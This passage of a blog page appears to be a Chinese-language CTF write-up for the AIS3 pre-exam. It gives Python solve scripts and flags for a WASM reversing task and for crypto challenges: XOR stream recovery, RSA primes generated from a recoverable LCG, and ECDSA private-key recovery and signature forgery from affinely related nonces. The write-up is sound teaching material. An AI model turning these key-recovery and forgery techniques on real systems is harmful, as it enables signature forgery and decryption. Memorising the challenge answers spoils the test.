+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def ror(val, r_bits, max_bits=64):</span><br><span class="line">    return ((val &gt;&gt; r_bits) | (val &lt;&lt; (max_bits - r_bits))) &amp; (2**max_bits - 1)</span><br><span class="line"></span><br><span class="line">def extract_shifts(magic, count=5):</span><br><span class="line">    shifts = []</span><br><span class="line">    for i in range(count):</span><br><span class="line">        shifts.append((magic &gt;&gt; (6 * i)) &amp; 0x3F)</span><br><span class="line">    return shifts</span><br><span class="line"></span><br><span class="line">expected = [</span><br><span class="line">    7577352992956835434,</span><br><span class="line">    7148661717033493303,</span><br><span class="line">    -7081446828746089091 &amp; (2**64 - 1),</span><br><span class="line">    -7479441386887439825 &amp; (2**64 - 1),</span><br><span class="line">    8046961146294847270,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">magic = -39934163 &amp; (2**32 - 1)</span><br><span class="line">shifts = extract_shifts(magic)</span><br><span class="line"></span><br><span class="line">parts = []</span><br><span class="line">for val, shift in zip(expected, shifts):</span><br><span class="line">    original = ror(val, shift)</span><br><span class="line">    parts.append(original.to_bytes(8, &#x27;little&#x27;))</span><br><span class="line"></span><br><span class="line">flag = b&#x27;&#x27;.join(parts)</span><br><span class="line">print(&quot;Flag:&quot;, flag.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+<p><code>flag</code> : AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}</p>
+<h2 id="crypto-mfctfxpre-examo"><a class="markdownIt-Anchor" href="#crypto-mfctfxpre-examo"></a> crypto [mfctf(x)/pre-exam(o)]</h2>
+<p>我只有cry的部分😢gemini pro才是mvp</p>
+<h3 id="stream"><a class="markdownIt-Anchor" href="#stream"></a> Stream</h3>
+<p>exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line"># 最後一個輸出</span><br><span class="line">cf_hex = &quot;0x1a95888d32cd61925d40815f139aeb35d39d8e33f7e477bd020b88d3ca4adee68de5a0dee2922628da3f834c9ada0fa283e693f1deb61e888423fd64d5c3694&quot;</span><br><span class="line">cf_int = int(cf_hex, 16)</span><br><span class="line"></span><br><span class="line"># 計算 isqrt</span><br><span class="line">r_guess = math.isqrt(cf_int)</span><br><span class="line"></span><br><span class="line"># 檢查位元長度 (256位是合理的)</span><br><span class="line">print(f&quot;R_guess bit length: &#123;r_guess.bit_length()&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 計算 F_guess</span><br><span class="line">f_guess_int = cf_int ^ (r_guess**2)</span><br><span class="line"></span><br><span class="line"># 轉換為 bytes</span><br><span class="line">f_bytes = f_guess_int.to_bytes((f_guess_int.bit_length() + 7) // 8, &#x27;big&#x27;)</span><br><span class="line"></span><br><span class="line">print(f_bytes)</span><br></pre></td></tr></table></figure>
+<p><code>flag</code> : AIS3{no_more_junks…plz}</p>
+<h3 id="random_rsa"><a class="markdownIt-Anchor" href="#random_rsa"></a> Random_RSA</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import gmpy2 # Still used for is_prime, powmod, gcd</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># --- Tonelli-Shanks Algorithm Implementation ---</span><br><span class="line">def legendre_symbol(a, p):</span><br><span class="line">    &quot;&quot;&quot; Computes the Legendre symbol (a/p) &quot;&quot;&quot;</span><br><span class="line">    ls = gmpy2.powmod(a, (p - 1) // 2, p)</span><br><span class="line">    if ls == p - 1:</span><br><span class="line">        return -1</span><br><span class="line">    return int(ls)</span><br><span class="line"></span><br><span class="line">def tonelli_shanks(n, p):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Solves x^2 = n (mod p) using Tonelli-Shanks algorithm.</span><br><span class="line">    p must be an odd prime.</span><br><span class="line">    Returns one solution x, or None if no solution exists.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    n = n % p</span><br><span class="line">    if n == 0:</span><br><span class="line">        return 0</span><br><span class="line">  </span><br><span class="line">    if legendre_symbol(n, p) != 1:</span><br><span class="line">        return None  # n is not a quadratic residue mod p</span><br><span class="line"></span><br><span class="line">    if p % 4 == 3:</span><br><span class="line">        x = gmpy2.powmod(n, (p + 1) // 4, p)</span><br><span class="line">        return int(x)</span><br><span class="line"></span><br><span class="line">    # Decompose p-1 = Q * 2^S such that Q is odd</span><br><span class="line">    Q = p - 1</span><br><span class="line">    S = 0</span><br><span class="line">    while Q % 2 == 0:</span><br><span class="line">        Q //= 2</span><br><span class="line">        S += 1</span><br><span class="line"></span><br><span class="line">    if S == 1: # This is equivalent to p % 4 == 3, handled above</span><br><span class="line">        x = gmpy2.powmod(n, (p + 1) // 4, p)</span><br><span class="line">        return int(x)</span><br><span class="line"></span><br><span class="line">    # Find a quadratic non-residue z mod p</span><br><span class="line">    z = 2</span><br><span class="line">    while legendre_symbol(z, p) != -1:</span><br><span class="line">        z += 1</span><br><span class="line">  </span><br><span class="line">    c = gmpy2.powmod(z, Q, p)</span><br><span class="line">    R = gmpy2.powmod(n, (Q + 1) // 2, p)</span><br><span class="line">    t = gmpy2.powmod(n, Q, p)</span><br><span class="line">    M_loop = S # In some literature M denotes S, using S_loop to avoid confusion with challenge&#x27;s M</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        if t == 0: return 0 # Should not happen if legendre_symbol(n,p)==1 and n!=0</span><br><span class="line">        if t == 1: return int(R)</span><br><span class="line">      </span><br><span class="line">        # Find smallest i such that t^(2^i) = 1 (mod p)</span><br><span class="line">        i = 0</span><br><span class="line">        temp_t = t</span><br><span class="line">        while temp_t != 1 and i &lt; M_loop : # i must be &lt; M_loop</span><br><span class="line">            temp_t = gmpy2.powmod(temp_t, 2, p)</span><br><span class="line">            i += 1</span><br><span class="line">      </span><br><span class="line">        if i == 0: # Should mean t was 1 already</span><br><span class="line">             return int(R)</span><br><span class="line">        if i == M_loop: # Should not happen if legendre symbol was 1</span><br><span class="line">            return None </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        b = gmpy2.powmod(c, gmpy2.powmod(2, M_loop - i - 1, p -1), p) # Exponent for c is 2^(M_loop-i-1)</span><br><span class="line">        R = (R * b) % p</span><br><span class="line">        t = (t * b * b) % p</span><br><span class="line">        c = (b * b) % p</span><br><span class="line">        M_loop = i</span><br><span class="line"># --- End of Tonelli-Shanks ---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Given values from the output</span><br><span class="line">h0 = 2907912348071002191916245879840138889735709943414364520299382570212475664973498303148546601830195365671249713744375530648664437471280487562574592742821690</span><br><span class="line">h1 = 5219570204284812488215277869168835724665994479829252933074016962454040118179380992102083718110805995679305993644383407142033253210536471262305016949439530</span><br><span class="line">h2 = 3292606373174558349287781108411342893927327001084431632082705949610494115057392108919491335943021485430670111202762563173412601653218383334610469707428133</span><br><span class="line">M = 9231171733756340601102386102178805385032208002575584733589531876659696378543482750405667840001558314787877405189256038508646253285323713104862940427630413</span><br><span class="line">n = 20599328129696557262047878791381948558434171582567106509135896622660091263897671968886564055848784308773908202882811211530677559955287850926392376242847620181251966209002883852930899738618123390979377039185898110068266682754465191146100237798667746852667232289994907159051427785452874737675171674258299307283</span><br><span class="line">e = 65537</span><br><span class="line">c = 13859390954352613778444691258524799427895807939215664222534371322785849647150841939259007179911957028718342213945366615973766496138577038137962897225994312647648726884239479937355956566905812379283663291111623700888920153030620598532015934309793660829874240157367798084893920288420608811714295381459127830201</span><br><span class="line"></span><br><span class="line"># Step 1: Recover LCG parameters a_lcg, b_lcg</span><br><span class="line">diff10 = (h1 - h0 + M) % M</span><br><span class="line">diff21 = (h2 - h1 + M) % M</span><br><span class="line"></span><br><span class="line">if diff10 == 0:</span><br><span class="line">    print(&quot;Error: h1 - h0 is zero, cannot compute inverse.&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">inv_diff10 = gmpy2.powmod(diff10, -1, M)</span><br><span class="line">a_lcg = (diff21 * inv_diff10) % M</span><br><span class="line">b_lcg = (h1 - a_lcg * h0 + M) % M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Step 2 helper: genPrime verification function</span><br><span class="line">def check_genprime_iterations(p_val_start_for_q, q_val_target, local_a_lcg, local_b_lcg, local_M, expected_j_rng_calls):</span><br><span class="line">    current_rng_input = p_val_start_for_q </span><br><span class="line">    current_rng_output = p_val_start_for_q </span><br><span class="line"></span><br><span class="line">    for k_rng_call in range(1, expected_j_rng_calls + 1):</span><br><span class="line">        current_rng_output = (local_a_lcg * current_rng_input + local_b_lcg) % local_M</span><br><span class="line">        is_current_prime = gmpy2.is_prime(current_rng_output)</span><br><span class="line"></span><br><span class="line">        if k_rng_call &lt; expected_j_rng_calls: </span><br><span class="line">            if is_current_prime:</span><br><span class="line">                return False </span><br><span class="line">        else: </span><br><span class="line">            if is_current_prime and current_rng_output == q_val_target:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br><span class="line">        current_rng_input = current_rng_output </span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Step 3: Iterate for j (number of LCG steps from p to q)</span><br><span class="line">A_curr = int(a_lcg) </span><br><span class="line">B_curr = int(b_lcg) </span><br><span class="line"></span><br><span class="line">MAX_J_ITERATIONS = 1000 </span><br><span class="line"></span><br><span class="line">for j_iter in range(1, MAX_J_ITERATIONS + 1):</span><br><span class="line">    if j_iter &gt; 1: </span><br><span class="line">        A_curr = (a_lcg * A_curr) % M </span><br><span class="line">        B_curr = (a_lcg * B_curr + b_lcg) % M</span><br><span class="line">  </span><br><span class="line">    C_n_val = (-n % M + M) % M</span><br><span class="line"></span><br><span class="line">    p_candidates_list = []</span><br><span class="line">    if A_curr == 0: </span><br><span class="line">        if B_curr != 0:</span><br><span class="line">            if gmpy2.gcd(B_curr, M) == 1: </span><br><span class="line">                inv_B_curr = gmpy2.powmod(B_curr, -1, M)</span><br><span class="line">                p_cand_val = (C_n_val * inv_B_curr) % M</span><br><span class="line">                p_candidates_list.append(p_cand_val)</span><br><span class="line">    else: </span><br><span class="line">        D_val = (B_curr**2 - 4 * A_curr * C_n_val) % M</span><br><span class="line">        D_val = (D_val + M) % M </span><br><span class="line"></span><br><span class="line">        s_sqrt = tonelli_shanks(D_val, M) # Using custom Tonelli-Shanks</span><br><span class="line">          </span><br><span class="line">        if s_sqrt is None: </span><br><span class="line">            continue </span><br><span class="line">      </span><br><span class="line">        s1_sqrt = s_sqrt</span><br><span class="line">        s2_sqrt = (M - s1_sqrt) % M</span><br><span class="line"></span><br><span class="line">        modval_2A_curr = (2 * A_curr) % M</span><br><span class="line">        if modval_2A_curr == 0: continue </span><br><span class="line">      </span><br><span class="line">        inv_2A_curr = gmpy2.powmod(modval_2A_curr, -1, M)</span><br><span class="line">          </span><br><span class="line">        p_cand1 = ((-B_curr + s1_sqrt) * inv_2A_curr) % M</span><br><span class="line">        p_cand2 = ((-B_curr + s2_sqrt) * inv_2A_curr) % M</span><br><span class="line">      </span><br><span class="line">        p_candidates_list.append(p_cand1)</span><br><span class="line">        if p_cand1 != p_cand2: </span><br><span class="line">            p_candidates_list.append(p_cand2)</span><br><span class="line">  </span><br><span class="line">    for p_val_cand_mod_M_iter in p_candidates_list:</span><br><span class="line">        p_actual_val = int(p_val_cand_mod_M_iter)</span><br><span class="line"></span><br><span class="line">        if p_actual_val == 0: continue </span><br><span class="line">        if n % p_actual_val != 0: continue </span><br><span class="line">      </span><br><span class="line">        term_for_L_val = (A_curr * pow(p_actual_val, 2) + B_curr * p_actual_val - n)</span><br><span class="line">      </span><br><span class="line">        if term_for_L_val % M != 0:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        L_div_M_val = term_for_L_val // M </span><br><span class="line"></span><br><span class="line">        if p_actual_val == 0: continue # Should have been caught already</span><br><span class="line">        if L_div_M_val !=0 and L_div_M_val % p_actual_val != 0 :</span><br><span class="line">            continue</span><br><span class="line">        elif L_div_M_val == 0: # K is 0</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        q_actual_val = n // p_actual_val</span><br><span class="line"></span><br><span class="line">        if not (gmpy2.is_prime(p_actual_val) and gmpy2.is_prime(q_actual_val)):</span><br><span class="line">            continue</span><br><span class="line">      </span><br><span class="line">        if check_genprime_iterations(p_actual_val, q_actual_val, a_lcg, b_lcg, M, j_iter):</span><br><span class="line">            phi_val = (p_actual_val - 1) * (q_actual_val - 1)</span><br><span class="line">            if gmpy2.gcd(e, phi_val) != 1: </span><br><span class="line">                print(&quot;Error: e is not coprime to phi.&quot;)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            d_sol_val = gmpy2.powmod(e, -1, phi_val)</span><br><span class="line">            m_int_val = gmpy2.powmod(c, d_sol_val, n)</span><br><span class="line">          </span><br><span class="line">            try:</span><br><span class="line">                flag_bytes = long_to_bytes(int(m_int_val))</span><br><span class="line">                print(f&quot;Flag: &#123;flag_bytes.decode()&#125;&quot;)</span><br><span class="line">            except Exception as err:</span><br><span class="line">                print(f&quot;Error decoding flag: &#123;m_int_val&#125;, &#123;err&#125;&quot;)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+<p><code>flag</code> : AIS3{1_d0n7_r34lly_why_1_d1dn7_u53_637pr1m3}</p>
+<h3 id="slowecdsa"><a class="markdownIt-Anchor" href="#slowecdsa"></a> SlowECDSA</h3>
+<p>解題流程:<br />
+<img src="https://hackmd.io/_uploads/S1oCdxXMxx.png" alt="image" /></p>
+<p><img src="https://hackmd.io/_uploads/rkNnOemGle.png" alt="image" /><br />
+exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from ecdsa import NIST192p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curve = NIST192p</span><br><span class="line">order = curve.generator.order() </span><br><span class="line">a = 1103515245                </span><br><span class="line">c = 12345                     </span><br><span class="line">example_msg = b&quot;example_msg&quot;  </span><br><span class="line">flag_msg = b&quot;give_me_flag&quot;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;Inserisci i valori esadecimali per la prima firma di &#x27;example_msg&#x27;:&quot;)</span><br><span class="line">r1_hex = input(&quot;r1 (hex): &quot;)</span><br><span class="line">s1_hex = input(&quot;s1 (hex): &quot;)</span><br><span class="line">print(&quot;\nInserisci i valori esadecimali per la seconda firma di &#x27;example_msg&#x27;:&quot;)</span><br><span class="line">r2_hex = input(&quot;r2 (hex): &quot;)</span><br><span class="line">s2_hex = input(&quot;s2 (hex): &quot;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    r1 = int(r1_hex, 16)</span><br><span class="line">    s1 = int(s1_hex, 16)</span><br><span class="line">    r2 = int(r2_hex, 16)</span><br><span class="line">    s2 = int(s2_hex, 16)</span><br><span class="line">except ValueError:</span><br><span class="line">    print(&quot;Errore: Assicurati di inserire valori esadecimali validi (es. 0x123abcdef).&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">h_example = int.from_bytes(hashlib.sha1(example_msg).digest(), &#x27;big&#x27;) % order</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s1_inv = pow(s1, -1, order)</span><br><span class="line">    s2_inv = pow(s2, -1, order)</span><br><span class="line">except ValueError:</span><br><span class="line">    print(f&quot;Errore: Impossibile calcolare l&#x27;inverso modulare per s1 (&#123;hex(s1)&#125;) o s2 (&#123;hex(s2)&#125;).&quot;)</span><br><span class="line">    print(&quot;Questo può accadere se s è 0 o non ha un inverso modulo l&#x27;ordine della curva.&quot;)</span><br><span class="line">    print(&quot;Verifica i valori di r e s forniti.&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sk_coeff_term = (s2_inv * r2 - a * s1_inv * r1) % order</span><br><span class="line"></span><br><span class="line">rhs_term = (a * s1_inv * h_example + c - s2_inv * h_example) % order</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    sk = (rhs_term * pow(sk_coeff_term, -1, order)) % order</span><br><span class="line">except ValueError:</span><br><span class="line">    print(f&quot;Errore: Impossibile calcolare l&#x27;inverso modulare per il coefficiente di sk (&#123;hex(sk_coeff_term)&#125;).&quot;)</span><br><span class="line">    print(&quot;Questo può accadere se il termine è 0 o non ha un inverso modulo l&#x27;ordine della curva.&quot;)</span><br><span class="line">    print(&quot;Verifica i valori di r e s. Potrebbe essere necessario ottenere nuove firme.&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">print(f&quot;\n[*] Chiave privata recuperata (sk): &#123;hex(sk)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">k1_calc = (s1_inv * (h_example + r1 * sk)) % order</span><br><span class="line">k2_calc_from_ecdsa = (s2_inv * (h_example + r2 * sk)) % order</span><br><span class="line">k2_calc_from_lcg = (a * k1_calc + c) % order</span><br><span class="line"></span><br><span class="line">if k2_calc_from_ecdsa != k2_calc_from_lcg:</span><br><span class="line">    print(f&quot;[!] Attenzione: k2 calcolato tramite ECDSA (&#123;hex(k2_calc_from_ecdsa)&#125;) e LCG (&#123;hex(k2_calc_from_lcg)&#125;) differiscono.&quot;)</span><br><span class="line">    print(&quot;    Questo potrebbe indicare un problema con i valori r/s inseriti o con il recupero di sk.&quot;)</span><br><span class="line">    print(&quot;    Si procederà utilizzando k2_calc_from_lcg per coerenza con l&#x27;LCG del server.&quot;)</span><br><span class="line"></span><br><span class="line">k_for_flag_sig = (a * k2_calc_from_lcg + c) % order</span><br><span class="line"></span><br><span class="line">print(f&quot;[*] k1 (nonce per la prima firma di esempio): &#123;hex(k1_calc)&#125;&quot;)</span><br><span class="line">print(f&quot;[*] k2 (nonce per la seconda firma di esempio): &#123;hex(k2_calc_from_lcg)&#125;&quot;)</span><br><span class="line">print(f&quot;[*] k3 (nonce previsto per la firma della flag): &#123;hex(k_for_flag_sig)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">h_flag = int.from_bytes(hashlib.sha1(flag_msg).digest(), &#x27;big&#x27;) % order</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    k3_inv = pow(k_for_flag_sig, -1, order)</span><br><span class="line">except ValueError:</span><br><span class="line">    print(f&quot;Errore: Impossibile calcolare l&#x27;inverso modulare per k3 (&#123;hex(k_for_flag_sig)&#125;).&quot;)</span><br><span class="line">    print(&quot;Questo può accadere se k3 è 0. Riprova l&#x27;attacco.&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R_flag_point = k_for_flag_sig * curve.generator</span><br><span class="line">r_flag = R_flag_point.x() % order</span><br><span class="line"></span><br><span class="line">s_flag = (k3_inv * (h_flag + r_flag * sk)) % order</span><br><span class="line"></span><br><span class="line">print(f&quot;\n[*] Per ottenere la flag, invia quanto segue all&#x27;opzione &#x27;verify&#x27; del server:&quot;)</span><br><span class="line">print(f&quot;    Messaggio: &#123;flag_msg.decode()&#125;&quot;)</span><br><span class="line">print(f&quot;    r (hex): &#123;hex(r_flag)&#125;&quot;)</span><br><span class="line">print(f&quot;    s (hex): &#123;hex(s_flag)&#125;&quot;)</span><br></pre></td></tr></table></figure>
+<p><code>flag</code> : AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily…}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      Auron
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        2.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:14
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
